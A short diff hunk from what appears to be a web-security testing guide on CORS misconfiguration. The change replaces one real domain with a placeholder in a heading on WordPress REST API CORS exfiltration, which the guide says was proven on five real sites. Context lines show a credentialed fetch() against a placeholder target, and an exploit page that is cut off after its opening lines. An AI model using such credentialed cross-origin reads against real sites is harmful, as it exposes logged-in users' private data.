@@ -198,7 +198,7 @@ fetch("https://TARGET/api/me", {credentials: "include"})
 If you see `BLOCKED` / a TypeError, the browser refused the read — it is NOT a
 valid finding regardless of what curl showed (this is the `ACAO: *` + creds case).
 
-**5b. WordPress REST API multi-endpoint CORS exfiltration** (proven on 5 real targets — ecommerce.example.com, mattress.example.com, realestate.example.com,tools-retailer.com, media.example.com):
+**5b. WordPress REST API multi-endpoint CORS exfiltration** (proven on 5 real targets — ecommerce.example.com, mattress.example.com, realestate.example.com,[RETAILER], media.example.com):
 ```html
 <!doctype html><body><pre id="out"></pre>
 <script>
